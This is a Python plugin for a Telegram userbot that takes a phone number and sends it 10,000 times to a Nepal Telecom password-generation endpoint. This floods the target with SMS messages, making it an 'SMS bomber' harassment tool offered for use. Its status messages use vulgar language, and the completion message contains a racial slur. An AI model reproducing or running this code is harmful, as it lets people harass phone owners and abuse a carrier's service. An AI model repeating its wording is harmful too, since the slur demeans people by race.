"""NTC Bomber custom plugin by @spider_encrypted
Format .ntc_fuck [phone number]"""
import asyncio
import requests
from userbot.utils import admin_cmd
@borg.on(admin_cmd("ntc_fuck (.*)"))
async def _(event):
    num=0
    n=10000
    input_str = event.pattern_match.group(1)
    if input_str:
        num = int(input_str)
    else:
        await event.edit("Enter a number!")
        return
    paramss={"phone":num}
    await event.edit("`Bombing....`")
    for i in range (n):
        requests.post("https://cms.ntc.net.np/api/generateAuthPassword",params=paramss)
    await event.edit(f"`{num} Nigga Is Fucked`")

    
